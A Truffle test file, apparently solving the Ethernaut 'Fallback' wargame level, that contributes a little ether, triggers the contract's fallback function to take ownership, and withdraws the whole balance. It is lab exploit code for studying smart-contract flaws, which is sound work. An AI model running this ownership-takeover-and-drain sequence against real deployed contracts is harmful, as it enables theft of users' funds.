const { expectRevert } = require('@openzeppelin/test-helpers');
const Fallback = artifacts.require('Fallback.sol');

const ethToWei = (item) => web3.utils.toWei(item);

contract('Fallback', (accounts) => {
    let fallback;
    const [owner, user1] = accounts;

    beforeEach(async () => {
        fallback = await Fallback.new({from: owner});
    });

    it('claim ownership & reduce contract balance to 0', async () => {

        // Send some amount to pass 'contributions[msg.sender] > 0)'
        await fallback.contribute({ from: user1, value: ethToWei('0.0005') });

        // Send some amount to non existing function to access the callback function
        // to get ownership
        await fallback.sendTransaction({ from: user1, value: ethToWei('0.0001') });

        // Check contract balance BEFORE
        const balanceBefore = await web3.eth.getBalance(fallback.address);

        // Withdraw all funds
        await fallback.withdraw({ from: user1 });

        // Check contract balance AFTER
        const balanceAfter = await web3.eth.getBalance(fallback.address);

        assert(balanceBefore === ethToWei('0.0006'));
        assert(balanceAfter === '0');
    });

});
